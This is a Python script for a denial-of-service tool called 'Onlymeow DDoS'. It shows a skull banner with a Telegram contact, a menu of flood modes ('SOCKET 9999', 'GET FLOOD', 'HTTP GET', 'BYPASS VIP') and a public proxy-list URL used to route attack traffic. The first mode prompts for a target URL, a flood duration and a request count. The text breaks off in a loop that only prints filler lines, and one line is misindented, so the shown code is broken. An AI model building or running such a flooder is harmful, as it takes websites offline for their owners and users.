from shutil import which
from urllib import parse
from os import system
import subprocess
import random
import os
import sys
import time
import json
import time
try: 
	import speedtest
	import colorama
	import requests
	import httpx
except Exception as e:
	sys.exit(e)


class Color:
	colorama.init(autoreset=True)
	LB = colorama.Fore.LIGHTBLUE_EX
	LC = colorama.Fore.LIGHTCYAN_EX
	LG = colorama.Fore.LIGHTGREEN_EX
	LR = colorama.Fore.LIGHTRED_EX
	LY = colorama.Fore.LIGHTYELLOW_EX
	RESET = colorama.Fore.RESET


class Home:
	def __init__(self,
	help,
	contact):
		self.help = help
		self.contact = contact

	def styleText(self, text):
		for animation in text:
			sys.stdout.write(animation)
			sys.stdout.flush()
			if animation != ".":
				time.sleep(0.01)
			else:
				time.sleep(1)

	def home(self): 
		print(f"""{Color.LR}


              
 ▒█████   ███▄    █  ██▓   ▓██   ██▓    ███▄ ▄███▓▓█████  ▒█████   █     █░   ▓█████▄ ▓█████▄  ▒█████    ██████ 
▒██▒  ██▒ ██ ▀█   █ ▓██▒    ▒██  ██▒   ▓██▒▀█▀ ██▒▓█   ▀ ▒██▒  ██▒▓█░ █ ░█░   ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
▒██░  ██▒▓██  ▀█ ██▒▒██░     ▒██ ██░   ▓██    ▓██░▒███   ▒██░  ██▒▒█░ █ ░█    ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
▒██   ██░▓██▒  ▐▌██▒▒██░     ░ ▐██▓░   ▒██    ▒██ ▒▓█  ▄ ▒██   ██░░█░ █ ░█    ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
░ ████▓▒░▒██░   ▓██░░██████▒ ░ ██▒▓░   ▒██▒   ░██▒░▒████▒░ ████▓▒░░░██▒██▓    ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ▒░▓  ░  ██▒▒▒    ░ ▒░   ░  ░░░ ▒░ ░░ ▒░▒░▒░ ░ ▓░▒ ▒      ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
  ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░ ▒  ░▓██ ░▒░    ░  ░      ░ ░ ░  ░  ░ ▒ ▒░   ▒ ░ ░      ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
░ ░ ░ ▒     ░   ░ ░   ░ ░   ▒ ▒ ░░     ░      ░      ░   ░ ░ ░ ▒    ░   ░      ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
    ░ ░           ░     ░  ░░ ░               ░      ░  ░    ░ ░      ░          ░       ░        ░ ░        ░  
                            ░ ░                                                ░       ░                        
            ══╦═════════════════════════════════╦══
    ╔═════════╩═════════════════════════════════╩═════════╗
    ║      Welcome To The My Onlymeow  ☠️                 ║ 🎶
    ║                                                     ║
    ║        Contact / Tele tdzvpbq                       ║
    ╚═════════════════════════════════════════════════════╝              
                         
     © Developer cc!? (onlymeow) no copyright by nat.zZ
""")
		print(Color.LR+"["+Color.LB+"01"+Color.LR+"]"+Color.LR+" SOCKET 9999")
		print(Color.LR+"["+Color.LY+"02"+Color.LR+"]"+Color.LR+" GET FLOOD")
		print(Color.LR+"["+Color.LC+"03"+Color.LR+"]"+Color.LR+" HTTP GET")
		print(Color.LR+"["+Color.LG+"04"+Color.LY+"]"+Color.LR+" BYPASS VIP")
		print(Color.LR+"["+Color.LR+"00"+Color.LB+"]"+Color.LR+" OUT")
		print("\n")
		http_proxy = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
		while True:
			sys.stdout.write(Color.LB+"⤻"+Color.LR+"["+Color.LG+"haccositinh"+Color.LB+"^^?"+Color.LG+"1710"+Color.LR+"]"+Color.LB+"\n➜ "+Color.RESET)
			option = input()
			if option == '01' or option == '1':
				try:
					url = str(input(f"{Color.LG} cc URL: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} cc Time: "+Color.RESET))
					reqs = int(input(f"{Color.LG} cc Reqs: "+Color.RESET))
					for i in range(200):
						print (f"{Color.LB}cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc {Color.LR}" + url)
						print (f"{Color.LB}cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc {Color.LR}" + url)
					        print (f"{Color.LB}cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc {Color.LR}" + url)
           
